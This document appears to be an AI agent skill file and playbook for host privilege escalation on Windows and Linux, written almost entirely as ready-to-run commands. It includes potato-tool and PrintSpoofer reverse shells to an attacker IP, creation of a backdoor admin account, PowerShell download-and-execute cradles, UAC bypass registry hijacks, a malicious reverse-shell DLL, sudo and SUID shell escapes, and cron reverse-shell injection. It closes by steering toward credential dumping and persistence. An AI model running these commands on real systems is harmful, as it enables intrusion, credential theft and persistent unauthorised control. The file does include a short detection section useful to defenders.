---
name: privilege-escalation
description: "Host privilege escalation — Windows token impersonation, UAC bypass, service abuse, DLL hijacking, Linux SUID/sudo/kernel exploits, automated enumeration."
allowed-tools: Bash Read Write
metadata:
  subdomain: privilege-escalation
  when_to_use: "privilege escalation, privesc, potato, PrintSpoofer, UAC bypass, SUID, sudo, winPEAS, linPEAS, kernel exploit, service abuse"
  tags: privesc, potato, uac, suid, sudo, kernel, service, dll-hijack, winpeas, linpeas
  mitre_attack: T1134.001, T1548.002, T1574.001, T1068, T1053.003
---

# Privilege Escalation Knowledge Base

Privilege escalation raises access from a low-privilege foothold to SYSTEM/root or administrative context. Windows and Linux have fundamentally different escalation paths. Always enumerate before exploiting — automated tools identify the fastest route.

## Quick Reference
```bash
# Windows — GodPotato (service account → SYSTEM)
GodPotato.exe -cmd "cmd /c whoami > C:\Windows\Temp\proof.txt"

# Windows — PrintSpoofer (service account → SYSTEM)
PrintSpoofer.exe -i -c cmd

# Windows — winPEAS automated enumeration
winPEASx64.exe servicesinfo applicationsinfo > C:\Windows\Temp\winpeas.txt

# Linux — linPEAS automated enumeration
./linpeas.sh -a | tee linpeas_<TARGET>.txt

# Linux — find SUID binaries
find / -perm -4000 -type f 2>/dev/null | tee suid_<TARGET>.txt

# Linux — check sudo privileges
sudo -l
```

## MITRE ATT&CK Mapping

| Technique ID | Name | Tools |
|-------------|------|-------|
| T1134.001 | Token Impersonation/Theft | GodPotato, PrintSpoofer, SigmaPotato |
| T1548.002 | Bypass UAC | fodhelper.exe, eventvwr.exe, CMSTPLUA COM |
| T1574.001 | DLL Search Order Hijacking | Custom DLL placement |
| T1068 | Exploitation for Privilege Escalation | Kernel exploits, linux-exploit-suggester |
| T1053.003 | Scheduled Task/Cron | Writable cron scripts, PATH injection |

## 1. Windows Token Impersonation — Potato Family

### GodPotato (Most Versatile)
```powershell
# Execute command as SYSTEM (DCOM-based token impersonation)
GodPotato.exe -cmd "cmd /c whoami"

# Reverse shell as SYSTEM
GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"

# Add local admin user
GodPotato.exe -cmd "net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add"

# Execute PowerShell payload
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')"
```

**GodPotato Details:**
- Works on Windows 8 through 11, Server 2012 through 2022
- Exploits DCOM (Distributed COM) OXID resolver
- Requires: `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`
- Common contexts: IIS AppPool, SQL Server, service accounts

### PrintSpoofer (Print Spooler Named Pipe)
```powershell
# Interactive SYSTEM shell
PrintSpoofer.exe -i -c cmd

# Execute specific command as SYSTEM
PrintSpoofer.exe -c "cmd /c whoami > C:\Windows\Temp\proof.txt"

# Reverse shell
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"

# With PowerShell
PrintSpoofer.exe -i -c powershell.exe
```

**PrintSpoofer Details:**
- Works on Windows 10, Server 2016 and 2019
- Exploits Print Spooler service named pipe impersonation
- Requires: `SeImpersonatePrivilege`
- May fail if Print Spooler service is disabled (hardened environments)

### SigmaPotato (Extended GodPotato Fork)
```powershell
# Standard SYSTEM execution
SigmaPotato.exe --revshell -l <ATTACKER_IP> -p 4444

# Execute arbitrary command
SigmaPotato.exe "cmd /c whoami"

# Uses .NET reflection for in-memory execution
SigmaPotato.exe "powershell -ep bypass -c Get-Process"
```

**SigmaPotato Details:**
- Extended OS support beyond GodPotato
- Uses .NET reflection for flexibility
- Same prerequisites: `SeImpersonatePrivilege`

### Choosing the Right Potato

| Tool | OS Range | Method | Best For |
|------|----------|--------|----------|
| GodPotato | Win 8-11, 2012-2022 | DCOM OXID | Default choice, widest support |
| PrintSpoofer | Win 10, 2016-2019 | Print Spooler pipe | When Spooler is running |
| SigmaPotato | Extended range | DCOM + .NET reflection | GodPotato alternative |
| JuicyPotato | Win 7-10, 2008-2016 | DCOM BITS | Legacy systems only |
| RoguePotato | Win 10 1809+, 2019 | OXID + RPC | When OXID resolver patched |

### Check Prerequisites
```powershell
# Verify you have impersonation privileges
whoami /priv
# Look for: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

# Common service accounts with SeImpersonatePrivilege:
# - IIS AppPool\DefaultAppPool
# - NT Service\MSSQLSERVER
# - Local Service / Network Service (some configs)
```

## 2. UAC Bypass Techniques

### fodhelper.exe Bypass
```powershell
# Set registry key to execute payload when fodhelper runs
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\payload.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

# Trigger UAC bypass
fodhelper.exe

# Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

### eventvwr.exe Bypass
```powershell
# Set registry hijack for Event Viewer
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "C:\Windows\Temp\payload.exe" /f

# Trigger bypass
eventvwr.exe

# Cleanup
reg delete HKCU\Software\Classes\mscfile /f
```

### CMSTPLUA COM Object Bypass
```powershell
# PowerShell COM object UAC bypass
$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7"))
$com.ShellExec("cmd.exe", "/c C:\Windows\Temp\payload.exe", "", "runas", 0)
```

### UAC Bypass Prerequisites
```
- User must be in local Administrators group
- UAC must NOT be set to "Always Notify" (highest setting)
- ConsentPromptBehaviorAdmin != 2 (require consent on secure desktop)
- Check: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
  - EnableLUA = 1 (UAC enabled)
  - ConsentPromptBehaviorAdmin = 5 (default — bypassable)
```

## 3. Windows Service Abuse

### Unquoted Service Paths
```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Example vulnerable path:
# C:\Program Files\Vulnerable App\Service Binary\app.exe
# Windows tries: C:\Program.exe → C:\Program Files\Vulnerable.exe → ...

# Exploit: place binary in writable path segment
copy C:\Windows\Temp\payload.exe "C:\Program Files\Vulnerable.exe"

# Restart service (requires service restart permission or reboot)
sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>
```

### Weak Service Permissions
```powershell
# Check service permissions with accesschk
accesschk.exe /accepteula -uwcqv "<USERNAME>" * | findstr /i "RW"

# Check specific service
sc qc <SERVICE_NAME>
accesschk.exe /accepteula -ucqv <SERVICE_NAME>

# If SERVICE_CHANGE_CONFIG is granted:
sc config <SERVICE_NAME> binpath= "C:\Windows\Temp\payload.exe"
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>

# SharpUp automated check
SharpUp.exe ModifiableServices
```

### DLL Hijacking
```powershell
# Identify DLL search order hijacking opportunities
# 1. Find services loading missing DLLs (Process Monitor)
# 2. Find writable directories in DLL search path

# Common hijackable DLLs:
# - Application directory DLLs loaded before System32
# - Missing DLLs that services try to load

# Create malicious DLL (on attacker machine)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll -o hijack.dll

# Place DLL in writable directory that appears before legitimate DLL path
copy hijack.dll "C:\Program Files\VulnApp\missing.dll"

# Trigger DLL load (restart service or wait for scheduled execution)
sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>
```

## 4. Linux Privilege Escalation

### SUID/SGID Binaries
```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null | tee suid_<TARGET>.txt

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Cross-reference with GTFOBins for escalation
# Common exploitable SUID binaries:
# /usr/bin/find      → find . -exec /bin/sh -p \;
# /usr/bin/vim       → vim -c ':!sh'
# /usr/bin/python3   → python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
# /usr/bin/bash      → bash -p
# /usr/bin/env       → env /bin/sh -p
# /usr/bin/nmap      → nmap --interactive → !sh (old versions)
# /usr/bin/cp        → cp /etc/shadow /tmp/shadow (read sensitive files)
# /usr/bin/wget      → overwrite /etc/passwd with crafted version

# Example: SUID python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: SUID find
/usr/bin/find / -name "anything" -exec /bin/bash -p \; -quit
```

### Sudo Misconfigurations
```bash
# Check sudo privileges
sudo -l

# Common exploitable sudo entries:
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!sh'

# (root) NOPASSWD: /usr/bin/less
sudo less /etc/shadow
# Then type: !sh

# (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/sh")}'

# (root) NOPASSWD: /usr/bin/find
sudo find / -name anything -exec /bin/sh \; -quit

# (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# (root) NOPASSWD: /usr/bin/env
sudo env /bin/sh

# (root) NOPASSWD: /usr/bin/tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# (root) NOPASSWD: /usr/bin/zip
sudo zip /tmp/a.zip /tmp/a -T --unzip-command="sh -c /bin/sh"

# LD_PRELOAD exploit (if env_keep += LD_PRELOAD in sudoers)
# Compile: gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
# pe.c: void _init() { setuid(0); system("/bin/bash"); }
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>
```

### Linux Capabilities
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null | tee capabilities_<TARGET>.txt

# Exploitable capabilities:
# cap_setuid+ep on python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid+ep on perl
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# cap_dac_read_search+ep (read any file)
# Can read /etc/shadow, SSH keys, etc.

# cap_net_raw+ep (raw sockets — packet capture)
# Can sniff network traffic without root
```

### Cron Job Exploitation
```bash
# Enumerate cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/crontabs/

# Find writable cron scripts
find /etc/cron* -writable -type f 2>/dev/null
ls -la /etc/cron.d/

# Writable script in cron — inject reverse shell
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /opt/scripts/backup.sh

# PATH injection in cron
# If crontab has: PATH=/home/user/bin:/usr/bin:/bin
# And runs: * * * * * root backup.sh
# Create: /home/user/bin/backup.sh with payload

# Cron wildcard injection (tar)
# If cron runs: tar czf /backup/files.tar.gz *
# In the target directory:
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# pspy — monitor cron and process execution without root
./pspy64 | tee pspy_<TARGET>.txt
```

### Kernel Exploits
```bash
# Gather kernel information
uname -a
cat /etc/os-release
cat /proc/version

# linux-exploit-suggester
./linux-exploit-suggester.sh | tee kernel_vulns_<TARGET>.txt

# linux-exploit-suggester-2 (Python)
python3 linux-exploit-suggester-2.py | tee kernel_vulns2_<TARGET>.txt

# Common kernel exploits (verify applicability before running):
# CVE-2021-4034 — PwnKit (pkexec, polkit < 0.120)
# CVE-2022-0847 — DirtyPipe (Linux 5.8-5.16.11)
# CVE-2022-2588 — route4 use-after-free (Linux 5.x)
# CVE-2023-0386 — OverlayFS (Ubuntu, various kernels)
# CVE-2023-32233 — nf_tables (Linux < 6.3.2)

# IMPORTANT: Kernel exploits can crash the system.
# Always check exact kernel version, distribution, and patch level.
# Test in non-production first when possible.
```

## 5. Automated Enumeration Tools

### winPEAS (Windows)
```powershell
# Full enumeration
winPEASx64.exe | tee C:\Windows\Temp\winpeas.txt

# Specific checks
winPEASx64.exe servicesinfo          # Service misconfigurations
winPEASx64.exe applicationsinfo      # Installed applications
winPEASx64.exe windowscreds          # Cached credentials, DPAPI
winPEASx64.exe userinfo              # User privilege info
winPEASx64.exe systeminfo            # OS, hotfixes, AV

# Quiet mode (less output)
winPEASx64.exe quiet servicesinfo windowscreds
```

### linPEAS (Linux)
```bash
# Full enumeration
./linpeas.sh -a 2>&1 | tee linpeas_<TARGET>.txt

# From remote without touching disk
curl -sSL https://<ATTACKER_IP>/linpeas.sh | bash | tee linpeas_<TARGET>.txt

# Key sections to review:
# [+] SUID binaries
# [+] Capabilities
# [+] Sudo -l
# [+] Writable files/dirs
# [+] Cron jobs
# [+] Kernel version (CVEs)
# [+] Interesting files (passwords, keys)
```

### SharpUp (Windows .NET)
```powershell
# All checks
SharpUp.exe audit

# Specific checks
SharpUp.exe ModifiableServices
SharpUp.exe ModifiableServiceBinaries
SharpUp.exe AlwaysInstallElevated
SharpUp.exe UnquotedServicePath
SharpUp.exe TokenPrivileges
```

### BeRoot (Cross-Platform)
```bash
# Windows
beRoot.exe

# Linux
python3 beroot.py

# Checks common escalation vectors automatically
```

## Tools & Resources

| Tool | Platform | Purpose | Key Usage |
|------|----------|---------|-----------|
| GodPotato | Windows | DCOM token impersonation | `-cmd "command"` |
| PrintSpoofer | Windows | Spooler pipe impersonation | `-i -c cmd` |
| SigmaPotato | Windows | Extended DCOM impersonation | `"command"` |
| winPEAS | Windows | Automated privesc enumeration | `servicesinfo`, `windowscreds` |
| linPEAS | Linux | Automated privesc enumeration | `-a` full audit |
| SharpUp | Windows | .NET privesc checker | `audit`, `ModifiableServices` |
| BeRoot | Both | Cross-platform privesc check | Auto-detect vectors |
| linux-exploit-suggester | Linux | Kernel exploit identification | Matches kernel version to CVEs |
| pspy | Linux | Process/cron monitoring (no root) | `./pspy64` |
| accesschk.exe | Windows | ACL/permission checker | `-uwcqv` service permissions |
| GTFOBins | Linux | SUID/sudo exploit reference | https://gtfobins.github.io |

## Detection Signatures

| Indicator | Source | Description |
|-----------|--------|-------------|
| DCOM OXID resolver calls | Network/ETW | GodPotato/SigmaPotato DCOM manipulation |
| 7045 (Service Install) | System | New service created — service abuse, Potato tools |
| 4688 + elevated token | Security | Process created with elevated token after impersonation |
| Registry: ms-settings | Sysmon 13 | fodhelper UAC bypass registry modification |
| Registry: mscfile | Sysmon 13 | eventvwr UAC bypass registry modification |
| Named pipe: \pipe\spoolss | Sysmon 17/18 | PrintSpoofer pipe impersonation |
| SUID execution anomaly | Auditd | Unexpected SUID binary execution |
| Sudo log anomaly | auth.log | Unusual sudo command patterns |
| Cron script modification | Auditd/AIDE | Changes to scheduled task scripts |
| Kernel exploit indicators | EDR/AV | Known exploit signatures, memory corruption |

### Key Detection Rules
```
# Potato DCOM detection
- Process spawned by service account executing as SYSTEM
- Unusual DCOM/RPC traffic patterns from service context

# UAC bypass detection (Sysmon EventID 13 — Registry value set)
- TargetObject|contains:
    - 'ms-settings\Shell\Open\command'     # fodhelper
    - 'mscfile\Shell\Open\command'         # eventvwr

# Service abuse detection (EventID 7045)
- ServiceFileName|contains:
    - '\Temp\'
    - '\Users\'
    - Unsigned binaries in non-standard paths

# Linux — suspicious SUID/capability usage
- Unexpected setuid(0) calls from non-standard binaries
- getcap showing new capabilities on user-writable binaries
```

## Decision Gate

```
Privilege Escalation ─┬─► Credential Access
                      │    (SYSTEM/root context enables LSASS dump, shadow read, key extraction)
                      │
                      └─► Persistence
                           (elevated privileges allow service install, scheduled task, rootkit)
```

**Next steps after privilege escalation:**
- **SYSTEM on Windows** → Dump LSASS, SAM/SECURITY hives → Credential Access skill
- **SYSTEM on Domain-joined host** → Extract cached domain credentials → Credential Access skill
- **root on Linux** → Read /etc/shadow, SSH keys, extract secrets → Credential Access skill
- **Local Admin** → Install persistence mechanism → Persistence
- **Service account → SYSTEM** → Pivot to credential extraction before moving laterally → Credential Access → Lateral Movement skill
- **Need domain escalation** → Use extracted creds for AD attacks → Credential Access skill
